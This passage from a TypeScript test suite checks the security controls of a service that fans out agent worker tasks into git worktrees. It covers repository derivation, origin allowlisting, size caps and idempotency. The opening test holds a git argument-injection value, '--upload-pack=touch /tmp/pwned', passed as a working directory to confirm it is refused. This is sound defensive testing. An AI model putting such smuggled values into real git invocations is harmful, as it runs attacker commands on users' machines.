    const h = setup({ cwd: '--upload-pack=touch /tmp/pwned' });
    const err = errorOf(await h.call(goodParams()));
    expect(err.code).toBe('FAILED_PRECONDITION');
    expect(vi.mocked(git)).not.toHaveBeenCalled();
  });

  // The repo used to come from `workspace.list` → `metadata.cwd`, which is
  // WORKSPACE-scoped and tracks whichever surface last changed directory. A
  // sibling pane in the caller's workspace could therefore choose the
  // repository a caller fans out over, without the caller doing anything.
  it("takes the cwd of the caller's OWN surface, not a sibling pane's", async () => {
    const h = setup();
    await h.call(goodParams());
    await h.flush();
    // The sibling row sits in a different repo and comes FIRST in the list.
    expect(h.request().repoPath).toBe(CALLER_REPO_ROOT);
    expect(h.request().repoPath).not.toBe(SIBLING_REPO_ROOT);
  });

  it('refuses when no surface belongs to the calling ptyId', async () => {
    // The identity hop answers for any ptyId, so this isolates the surface
    // match: a caller whose pty owns no surface has no cwd of its own, and
    // must not inherit one from the workspace.
    const h = setup();
    const err = errorOf(await h.call(goodParams({ senderPtyId: 'pty-nowhere' })));
    expect(err.code).toBe('FAILED_PRECONDITION');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  // The call is asynchronous now, so the gap between "the dialog said /repo"
  // and "the worktree is created" is however long the user takes to answer.
  it('refuses if the caller moved to another repository while the prompt was up', async () => {
    const h = setup({ approval: 'hang' });
    await h.call(goodParams());
    // The prompt is on screen, naming CALLER_REPO_ROOT. The caller cds away.
    h.moveCaller(SIBLING_CWD);
    h.approveHungPrompt();
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
    expect(await h.call(goodParams())).toMatchObject({ status: 'denied', reason: 'repo-moved' });
  });

  it('refuses if the repository cannot be re-derived at approval time', async () => {
    const h = setup({ approval: 'hang' });
    await h.call(goodParams());
    h.moveCaller(null);
    h.approveHungPrompt();
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
    expect(await h.call(goodParams())).toMatchObject({ status: 'denied', reason: 'repo-moved' });
  });

  it('still starts when the caller has not moved', async () => {
    const h = setup({ approval: 'hang' });
    await h.call(goodParams());
    h.approveHungPrompt();
    await h.flush();
    expect(h.start).toHaveBeenCalledTimes(1);
    expect(h.request().repoPath).toBe(CALLER_REPO_ROOT);
  });
});

// ── R4 ────────────────────────────────────────────────────────────────────
// Same lane as the a2a execute spawn: local only, everything else fails closed.
describe('R4 — origin allowlist is fail-closed', () => {
  it('rejects a remote-origin caller', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams(), { origin: 'remote' }));
    expect(err.code).toBe('NOT_AUTHORIZED');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a caller with no context at all', async () => {
    const h = setup();
    const err = errorOf(await h.callWithoutCtx(goodParams()));
    expect(err.code).toBe('NOT_AUTHORIZED');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects before doing ANY identity or repo resolution', async () => {
    const h = setup();
    await h.call(goodParams(), { origin: 'remote' });
    expect(vi.mocked(sendToRenderer)).not.toHaveBeenCalled();
    expect(vi.mocked(git)).not.toHaveBeenCalled();
  });
});

// ── R5 ────────────────────────────────────────────────────────────────────
// The GUI offers 1..8; the wire does not go through the GUI.
describe('R5 — task count is capped server-side', () => {
  it(`rejects more than ${FANOUT_MAX_TASKS} titles`, async () => {
    const h = setup();
    const titles = Array.from({ length: FANOUT_MAX_TASKS + 1 }, (_, k) => `task ${k}`);
    const err = errorOf(await h.call(goodParams({ titles })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    expect(err.message).toContain(String(FANOUT_MAX_TASKS));
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a huge array on its raw length (before any per-element work)', async () => {
    const h = setup();
    const titles = Array.from({ length: 5000 }, () => '');
    const err = errorOf(await h.call(goodParams({ titles })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it(`accepts exactly ${FANOUT_MAX_TASKS}`, async () => {
    const h = setup();
    const titles = Array.from({ length: FANOUT_MAX_TASKS }, (_, k) => `task ${k}`);
    const res = await h.call(goodParams({ titles }));
    expect(res).toMatchObject({ ok: true, taskCount: FANOUT_MAX_TASKS });
  });

  it('rejects an over-long taskPrompts array too', async () => {
    const h = setup();
    const taskPrompts = Array.from({ length: FANOUT_MAX_TASKS + 1 }, () => 'p');
    const err = errorOf(await h.call(goodParams({ taskPrompts })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a non-array taskPrompts rather than treating it as absent', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ taskPrompts: 'just one' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects zero usable titles', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: ['   ', ''] })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects a non-array titles', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: 'one, two' })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── R6 ────────────────────────────────────────────────────────────────────
describe('R6 — prompt and title sizes are capped server-side', () => {
  it('rejects an oversized shared prompt', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ prompt: 'x'.repeat(FANOUT_PROMPT_MAX_BYTES + 1) })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('rejects when shared + per-task together exceed the cap', async () => {
    const h = setup();
    const half = 'x'.repeat(FANOUT_PROMPT_MAX_BYTES - 10);
    const err = errorOf(
      await h.call(goodParams({ titles: ['a'], prompt: half, taskPrompts: ['y'.repeat(100)] })),
    );
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });

  it('measures the cap in UTF-8 BYTES, not characters', async () => {
    const h = setup();
    // Each CJK char is 3 bytes, so this is under the char count but over bytes.
    const prompt = '가'.repeat(Math.floor(FANOUT_PROMPT_MAX_BYTES / 3) + 1);
    expect(prompt.length).toBeLessThan(FANOUT_PROMPT_MAX_BYTES);
    const err = errorOf(await h.call(goodParams({ prompt })));
    expect(err.code).toBe('INVALID_ARGUMENT');
  });

  it('rejects an over-long title', async () => {
    const h = setup();
    const err = errorOf(await h.call(goodParams({ titles: ['t'.repeat(CHANNEL_TOPIC_MAX + 1)] })));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });
});

describe('the idempotency key is required', () => {
  it('rejects a missing key', async () => {
    const h = setup();
    const params = goodParams();
    delete params.idempotencyKey;
    const err = errorOf(await h.call(params));
    expect(err.code).toBe('INVALID_ARGUMENT');
    await h.flush();
    expect(h.start).not.toHaveBeenCalled();
  });
});

// ── one service, two front doors ──────────────────────────────────────────
//
// The idempotency LRU and the in-flight set are INSTANCE fields of
// FanOutService, and so is the TaskWorktreeManager serial queue that keeps
// concurrent `git worktree add` off one repo. A second instance therefore means
// the same key is accepted twice and the fan-out runs twice. That invariant
// lives in main/index.ts wiring, which no unit test can exercise, so pin it at
// the source level instead.
describe('FanOutService is constructed exactly once in main', () => {
  // src/main/pipe/handlers/__tests__ -> src/main
  const MAIN_DIR = nodePath.resolve(__dirname, '..', '..', '..');

  function collectTsFiles(dir: string): string[] {
    const out: string[] = [];
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = nodePath.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name === '__tests__' || entry.name === 'node_modules') continue;
        out.push(...collectTsFiles(full));
      } else if (entry.name.endsWith('.ts') && !entry.name.endsWith('.d.ts')) {
        out.push(full);
      }
    }
    return out;
  }

  it('has exactly one `new FanOutService(` in src/main, in the factory', () => {
    const sites = collectTsFiles(MAIN_DIR).filter((f) =>
      /\bnew FanOutService\s*\(/.test(fs.readFileSync(f, 'utf8')),
    );
    expect(sites.map((f) => nodePath.relative(MAIN_DIR, f))).toEqual([
      nodePath.join('worktask', 'createFanOutService.ts'),
    ]);
  });

  it('wires both front doors from one createFanOutService call', () => {
    const src = fs.readFileSync(nodePath.join(MAIN_DIR, 'index.ts'), 'utf8');
    const created = src.match(/createFanOutService\s*\(/g) ?? [];
    expect(created).toHaveLength(1);
    // Both registrars receive the SAME binding.
    expect(src).toMatch(/const fanOutService = createFanOutService\(/);
    expect(src).toMatch(/registerFanOutRpc\(rpcRouter, fanOutService,/);
    expect(src).toMatch(/registerFanOutHandler\(fanOutService\)/);
  });
});

// ── the accept's warnings ─────────────────────────────────────────────────
//
// Wave 3, finding 12: the owner workspace carried an unanswered decision from a
// previous app session, which blocks EVERY wake. The fan-out was accepted, the
// workers ran and finished, and nothing ever reached the brain. The accept is
// the one moment the caller is reading a reply, so it says so there.
describe('the accepted reply warns about a pending decision on the owner', () => {
  it('carries the warning naming the workspace and the decision id', async () => {
    vi.mocked(loadWorkspaceDecision).mockReturnValue({
      id: 'dec-9',
      question: 'resume?',
      options: [],
      context: '',
      status: 'pending',
      raisedAt: 0,
    });
    const h = setup();
    const res = await h.call(goodParams());
    expect(res).toMatchObject({ ok: true, status: 'accepted' });
    const warnings = res['warnings'] as string[];
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toContain(`owner workspace ${CALLER_WS} has a pending decision dec-9`);
    expect(warnings[0]).toContain('worker events will not wake the brain until it is answered');
  });

  it('omits the field entirely when there is no pending decision', async () => {
    vi.mocked(loadWorkspaceDecision).mockReturnValue(null);
    const h = setup();
    expect(await h.call(goodParams())).not.toHaveProperty('warnings');
  });

  it('a resolved decision is not a warning, and a torn store is not an error', async () => {
    vi.mocked(loadWorkspaceDecision).mockReturnValue({
      id: 'dec-1',
      question: 'q',
      options: [],
      context: '',
      status: 'resolved',
      raisedAt: 0,
    });
    expect(await setup().call(goodParams())).not.toHaveProperty('warnings');

    vi.mocked(loadWorkspaceDecision).mockImplementation(() => {
      throw new Error('torn store');
    });
    expect(await setup().call(goodParams())).toMatchObject({ ok: true, status: 'accepted' });
  });
});
